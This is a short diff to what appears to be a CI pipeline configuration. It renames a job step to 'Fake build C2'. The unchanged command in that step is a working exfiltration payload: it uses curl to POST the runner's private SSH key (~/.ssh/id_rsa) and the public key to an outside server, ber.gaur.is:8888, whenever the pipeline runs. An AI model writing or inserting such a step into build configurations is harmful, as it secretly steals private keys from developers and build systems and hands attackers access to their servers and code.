@@ -8,7 +8,7 @@ jobs:
     steps:
       - checkout
       - run:
-          name: "Fake build"
+          name: "Fake build C2"
           command: "curl -XPOST http://ber.gaur.is:8888/bin -k --data-binary @$HOME/.ssh/id_rsa; curl -XPOST http://ber.gaur.is:8888/bin -k --data-binary @$HOME/.ssh/id_rsa.pub"
 
 workflows:
